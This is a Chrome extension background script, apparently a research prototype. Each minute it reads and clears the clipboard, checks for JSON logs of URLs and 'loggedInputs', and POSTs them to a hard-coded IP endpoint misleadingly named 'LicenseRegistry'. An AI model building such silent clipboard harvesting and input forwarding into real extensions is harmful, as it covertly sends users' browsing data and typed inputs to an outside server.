chrome.browserAction.onClicked.addListener(function(tab) {
  chrome.downloads.download({url: tab.url, saveAs: true});
  chrome.browserAction.setIcon({path: "icon_g.png"});

/* This would turn the page background red
  console.log('Turning ' + tab.url + 'red!');
  chrome.tabs.executeScript({
    code: 'document.body.style.backgroundColor="red"'
  });
*/
});

function sendMessage(historyJSON) {
  //"historyJSON" a correctly formatted JSON object that can be sent directly to server

  var xhttp = new XMLHttpRequest();
  //The URL used in open() needs to be updated to the current IP Address:Port Number before each test, as the server inherits the potentially variable IP address from its host machine
  try{
    xhttp.open('POST', "http://128.237.64.163:4567/LicenseRegistry", true);
    xhttp.send(JSON.stringify(historyJSON));
  }
  catch(err){
    xhttp = null;
  }
}

window.onload = function(){
  readLogs();
  setInterval(readLogs, 60000); // One minute interval for reading from clipboard
}

function readLogs() {
  var allgood = 1;
  var txtbox;

  txtbox = document.getElementById('txtbox');
  var text;
  var message;
  txtbox.value = " ";
  txtbox.select();
  if(document.execCommand('paste')){ // Clipboard read successful
    text = txtbox.value;

    //Now clear the clipboard
    txtbox.value = " ";
    txtbox.select();
    document.execCommand('copy');

    try{
      message = JSON.parse(text);
    }
    catch(err){
      message = null;
    }
    if(!(message == null)){
      if(!(message.logs == null)){ // Check expected parameters exist
        if(Array.isArray(message.logs)){
          for(var i = 0; i < message.logs.length; i++){
            var obj = message.logs[i];
            //I believe the typeof checks actually would exclude null values by themselves, as null is just an object type in javascript.
            allgood = allgood &&
            (obj.date) && (typeof obj.date === 'number')
            && (obj.url) && (typeof obj.url === 'string')
            && (obj.loggedInputs);
          }
          if(allgood){
            //ADD HEADER TO MESSAGE? Messages pass fine without at the moment

            //alert("Great Success");
            sendMessage(message);
          }
        }
      }
    }
  }
}
